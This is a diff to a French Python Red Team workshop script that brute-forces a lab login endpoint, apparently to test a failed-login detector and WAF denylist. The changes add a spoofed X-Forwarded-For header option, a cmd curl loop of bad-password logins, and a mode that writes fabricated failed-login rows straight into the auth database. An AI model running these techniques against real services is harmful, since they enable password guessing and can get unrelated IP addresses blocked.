@@ -19,6 +19,20 @@ Le script optimise le sequencement pour aller vite sans perdre d'essai :
   - chaque tentative est tracee dans un journal JSON (`.jsonl` pendant l'attaque,
     `.json` complet a la fin).
 
+Mode campagne courte (declenchement deterministe du detecteur, sans dictionnaire) :
+
+    python3 lab.py --direct --ip 203.0.113.66 --attempts 6 --email admin@resilience.local
+
+Equivalent de la boucle cmd :
+
+    for /L %i in (1,1,6) do curl -s -o nul -X POST http://localhost:3010/v1/login ^
+      -H "Content-Type: application/json" -H "X-Forwarded-For: 203.0.113.66" ^
+      -d "{\"email\":\"admin@resilience.local\",\"password\":\"mauvais\"}"
+
+L'IP injectee n'est retenue que si la requete vient d'un proxy de confiance : passer par
+`--direct` (port 3010) pour qu'elle soit comptee. Via le WAF, l'adresse reelle du client
+est ajoutee en fin de X-Forwarded-For et c'est elle qui compte.
+
 Outil Red Team du workshop : a n'utiliser que sur la plateforme de laboratoire.
 """
 
@@ -28,6 +42,7 @@ import http.client
 import json
 import random
 import re
+import subprocess
 import sys
 import threading
 import time
@@ -158,13 +173,14 @@ def classer_mots(mots: list[str]) -> list[str]:
 class ClientHTTP:
     """Une connexion TCP maintenue ouverte et reutilisee : un seul handshake par fil."""
 
-    def __init__(self, url: str, timeout: float) -> None:
+    def __init__(self, url: str, timeout: float, en_tetes: dict[str, str] | None = None) -> None:
         p = urlsplit(url)
         self.scheme = p.scheme or "http"
         self.host = p.hostname or "localhost"
         self.port = p.port or (443 if self.scheme == "https" else 80)
         self.path = p.path or "/"
         self.timeout = timeout
+        self.en_tetes = dict(en_tetes or {})
         self._conn: http.client.HTTPConnection | None = None
 
     def _connect(self) -> http.client.HTTPConnection:
@@ -191,6 +207,7 @@ class ClientHTTP:
             "Content-Length": str(len(body)),
             "Connection": "keep-alive",
         }
+        headers.update(self.en_tetes)
         for essai in (1, 2):
             try:
                 conn = self._conn or self._connect()
@@ -219,6 +236,7 @@ def lancer_attaque(
     quiet: bool,
     palette: Palette,
     journal,
+    en_tetes: dict[str, str] | None = None,
 ) -> dict:
     etats = {
         email: {
@@ -251,7 +269,7 @@ def lancer_attaque(
     blocages = {"consecutifs": 0}
 
     def worker() -> None:
-        client = ClientHTTP(url, timeout)
+        client = ClientHTTP(url, timeout, en_tetes)
         while not arret_global.is_set():
             with verrou:
                 if curseur["i"] >= len(taches):
@@ -455,6 +473,48 @@ def parse_args() -> argparse.Namespace:
         action="store_true",
         help="ne pas s'arreter au premier mot de passe trouve (teste tout le dictionnaire)",
     )
+    p.add_argument(
+        "--ip",
+        default=None,
+        help="IP source injectee dans X-Forwarded-For. Elle est retenue par le service "
+             "auth uniquement si la requete vient d'un proxy de confiance (boucle locale) : "
+             "utiliser --direct pour qu'elle soit prise en compte. Ignoree via le WAF.",
+    )
+    p.add_argument(
+        "--attempts",
+        type=int,
+        default=None,
+        help="mode campagne courte : nombre de tentatives a mot de passe fixe, sans dictionnaire "
+             "(equivalent du for /L de cmd Windows). Le detecteur est declenche apres 5 echecs "
+             "sur 120 s pour une meme IP.",
+    )
+    p.add_argument(
+        "--password",
+        default="mauvais-mot-de-passe",
+        help="mot de passe utilise en mode --attempts (defaut : mauvais-mot-de-passe)",
+    )
+    p.add_argument(
+        "--inject-db",
+        action="store_true",
+        help="simulation d'observation : ecrit directement les echecs dans login_attempts "
+             "(docker exec db-auth). A utiliser quand l'IP source ne peut pas etre injectee "
+             "dans X-Forwarded-For. Ce n'est pas une attaque : le signal est fabrique.",
+    )
+    p.add_argument(
+        "--db-container",
+        default="db-auth",
+        help="conteneur PostgreSQL des tentatives (defaut : db-auth)",
+    )
+    p.add_argument(
+        "--db-user",
+        default="auth_user",
+        help="utilisateur PostgreSQL (defaut : auth_user)",
+    )
+    p.add_argument(
+        "--db-name",
+        default="auth",
+        help="base PostgreSQL (defaut : auth)",
+    )
     p.add_argument("--quiet", action="store_true", help="ne pas afficher le detail des tentatives")
     p.add_argument(
         "--log-dir",
@@ -481,6 +541,60 @@ def build_url(host: str | None, direct: bool) -> str:
     return cible
 
 
+def commandes_verification(ip: str) -> str:
+    """Commandes a lancer sur le PC Hote pour verifier la chaine complete."""
+    return "\n".join([
+        "# 1. l'IP a-t-elle ete enregistree par le service auth ?",
+        "docker exec db-auth psql -U auth_user -d auth -c \""
+        "select ip, count(*), max(created_at) from login_attempts "
+        f"where created_at > now() - interval '3 minutes' group by ip;\"",
+        "",
+        "# 2. le detecteur a-t-il cree l'incident ?",
+        "docker exec db-remediation psql -U remediation_user -d remediation -c \""
+        "select type, source_ip, status, created_at from incidents "
+        "order by created_at desc limit 3;\"",
+        "",
+        "# 3. l'IP est-elle dans la liste de deni du WAF ?",
+        "docker exec waf sh -c \"cat /etc/nginx/denylist/*.conf 2>/dev/null || echo 'liste vide'\"",
+        "",
+        f"# (l'IP cherchee : {ip})",
+    ])
+
+
+def injecter_observations(
+    ip: str,
+    email: str,
+    nombre: int,
+    conteneur: str,
+    utilisateur: str,
+    base: str,
+) -> int:
+    """Ecrit des echecs de connexion observes dans login_attempts (simulation)."""
+    sql = (
+        "insert into login_attempts (id,email,user_id,ip,success,reason,created_at) "
+        "select gen_random_uuid(), '{email}', null, '{ip}', false, 'bad_password', "
+        "now() - (g || ' seconds')::interval from generate_series(0,{n}) g;"
+    ).format(email=email.replace("'", "''"), ip=ip.replace("'", "''"), n=max(1, nombre) - 1)
+
+    commande = ["docker", "exec", conteneur, "psql", "-U", utilisateur, "-d", base, "-c", sql]
+    try:
+        resultat = subprocess.run(commande, capture_output=True, text=True, timeout=30)
+    except FileNotFoundError:
+        print("[!] docker introuvable sur cette machine", file=sys.stderr)
+        return 2
+    except subprocess.TimeoutExpired:
+        print("[!] la commande docker a expire", file=sys.stderr)
+        return 2
+
+    if resultat.returncode != 0:
+        print(f"[!] injection refusee : {resultat.stderr.strip()}", file=sys.stderr)
+        return 2
+    sortie = resultat.stdout.strip()
+    if sortie:
+        print(sortie)
+    return 0
+
+
 def main() -> int:
     args = parse_args()
     if args.offline:
@@ -488,7 +602,33 @@ def main() -> int:
 
     palette = Palette(sys.stdout.isatty())
     url = build_url(args.host, args.direct)
-    mots = classer_mots(load_wordlists(args.wordlist or DEFAULT_WORDLISTS))
+    mode_campagne = args.attempts is not None
+
+    if args.inject_db:
+        if not args.ip:
+            print("[!] --inject-db exige --ip <adresse a simuler>", file=sys.stderr)
+            return 2
+        nombre = args.attempts or 6
+        email = (args.email or ["victim@resilience.local"])[0]
+        print(palette.yellow("[*] Simulation d'observation : les echecs sont ecrits directement"))
+        print(palette.yellow("    dans login_attempts. Ce n'est pas une attaque reelle :"))
+        print(palette.yellow("    le signal du detecteur est fabrique, l'IP non."))
+        print()
+        sys.stdout.flush()
+        code = injecter_observations(
+            args.ip, email, nombre, args.db_container, args.db_user, args.db_name
+        )
+        if code != 0:
+            return code
+        print()
+        print(commandes_verification(args.ip))
+        return 0
+
+    if mode_campagne:
+        # Campagne courte : un mot de passe faux repete N fois. Pas de dictionnaire.
+        mots = [args.password] * max(1, args.attempts)
+    else:
+        mots = classer_mots(load_wordlists(args.wordlist or DEFAULT_WORDLISTS))
     comptes = args.email or load_targets(args.targets_file)
 
     if not mots:
@@ -497,6 +637,14 @@ def main() -> int:
     if not comptes:
         print(f"[!] aucun compte vise (utiliser --email ou --targets-file {args.targets_file})", file=sys.stderr)
         return 2
+    if mode_campagne:
+        comptes = comptes[:1]
+        # Serie sequentielle : la campagne courte imite une boucle, pas un tir de charge.
+        args.threads = 1
+
+    en_tetes: dict[str, str] = {}
+    if args.ip:
+        en_tetes["X-Forwarded-For"] = args.ip
 
     horodatage = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
     args.log_dir.mkdir(parents=True, exist_ok=True)
@@ -515,11 +663,21 @@ def main() -> int:
 
     print(palette.bold(f"[*] Cible  : {url}"))
     print(f"[*] Comptes : {', '.join(comptes)}")
-    print(f"[*] Dictionnaire : {len(mots)} mots de passe (classes par probabilite)")
+    if mode_campagne:
+        print(f"[*] Mode   : campagne courte, {args.attempts} tentatives a mot de passe fixe")
+    else:
+        print(f"[*] Dictionnaire : {len(mots)} mots de passe (classes par probabilite)")
+    if args.ip:
+        print(f"[*] IP injectee : {args.ip} (X-Forwarded-For)")
     print(f"[*] Cadence : {args.threads} fils, {args.delay}s entre deux tentatives")
     print(f"[*] Journal : {journal_chemin}")
     if not urlsplit(url).hostname in ("localhost", "127.0.0.1", "::1"):
         print(palette.yellow("[!] Cible distante : a n'utiliser que sur le labo autorise."))
+    if args.ip and not args.direct and (url == DEFAULT_URL or urlsplit(url).port in (None, 80)):
+        print(palette.yellow(
+            "[!] IP injectee et cible via le WAF : le WAF ajoute l'adresse reelle a la fin "
+            "de X-Forwarded-For, c'est elle qui sera comptee. Utiliser --direct."
+        ))
     print()
 
     resultat = lancer_attaque(
@@ -534,6 +692,7 @@ def main() -> int:
         args.quiet,
         palette,
         journal,
+        en_tetes,
     )
     journal_fichier.close()
 
@@ -567,6 +726,7 @@ def main() -> int:
             "hote": urlsplit(url).hostname,
             "port": urlsplit(url).port,
             "mode": "direct" if args.direct else ("waf" if args.host is None else "waf"),
+            "ip_injectee": args.ip,
         },
         "options": {
             "threads": args.threads,
@@ -576,6 +736,7 @@ def main() -> int:
             "continue_after_success": args.continue_after_success,
             "comptes": comptes,
             "taille_dictionnaire": len(mots),
+            "mode_campagne": mode_campagne,
         },
         "resume": {
             "debut": resultat["debut_iso"],
@@ -597,6 +758,14 @@ def main() -> int:
 
     if trouves:
         print(palette.green("[*] Attaque reussie : identifiants valides obtenus."))
+        return 0
+    if mode_campagne:
+        print(palette.yellow(
+            f"[*] Campagne terminee : {total} tentatives refusees depuis "
+            f"{args.ip or urlsplit(url).hostname}."
+        ))
+        print()
+        print(commandes_verification(args.ip or urlsplit(url).hostname or "?"))
         return 0
     print(palette.red("[*] Attaque echouee : aucun couple email / mot de passe valide."))
     return 1
